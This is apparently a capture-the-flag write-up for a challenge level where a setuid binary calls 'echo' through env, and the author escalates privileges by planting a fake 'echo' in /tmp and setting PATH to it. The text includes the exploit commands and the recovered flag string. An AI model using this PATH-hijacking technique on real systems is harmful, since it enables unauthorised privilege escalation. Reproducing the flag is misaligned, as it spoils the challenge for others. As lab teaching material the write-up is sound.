# level03 solve

Firstly, at all, when we get logged and trying to see if we got the file we can see we have one file ` level03 `

```
$ ls
> level03
```

It look like an binary file so we decide to run it.

```
$ ./level03
> Exploit me
```

After some try with gdb we decide to see inside the file.

```
$ cat ./level03
```

And we see some multiple line interesting. But the most curious line was ` /usr/bin/env echo Exploit me `

```
▒[▒/usr/bin/env echo Exploit me0p▒▒▒L▒▒▒▒p▒▒▒▒▒▒▒▒▒▒▒▒▒▒zR|
```

After some reflexion, we decide to try se if the tmp folder got all right.
And it is the case, so we decide to redirect echo on getflag, because we suppose that the executable use ` execve ` for printing the message with the bin ` echo ` .

```
$ echo /bin/getflag > /tmp/echo
$ chmod 777 /tmp/echo
$ export PATH=/tmp
```

On line :

```
$ echo /bin/getflag > /tmp/echo ; chmod 777 /tmp/echo ; export PATH=/tmp
```

Remember to get back the old path.

```
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Trying againt and...

```
$ ./level03
> qi0maab88jeaj46qoumi7maus
```

We got it!

> <a href="../flag">flag</a> - <a href="../../level02">previous level</a> - <a href="../../level04">next level</a>
